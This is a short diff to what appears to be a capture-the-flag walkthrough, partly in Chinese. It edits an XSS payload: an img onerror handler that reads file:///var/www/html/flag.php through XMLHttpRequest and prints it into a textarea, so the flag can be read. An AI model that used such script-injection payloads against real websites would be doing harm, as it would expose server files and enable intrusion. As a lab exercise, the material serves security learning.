@@ -5,6 +5,6 @@ firefox or chrome
 # Steps
 * step 1 输入框输入
 ```html
-<img src="e" onerror="var x=new XMLHttpRequest();x.open('GET','file:///var/www/html/flag.php',false);x.send(null);document.write('<textarea>'+x.responseText+'</textarea>');">
+<img src="e" onerror="var x=new XMLHttpRequest();x.open('GET','file:///var/www/html/flag.php',false);x.send(null);document.write('<textarea rows=10 cols=70>'+x.responseText+'</textarea>');">
 ```
 * step 2 点击即可在图片中获得flag
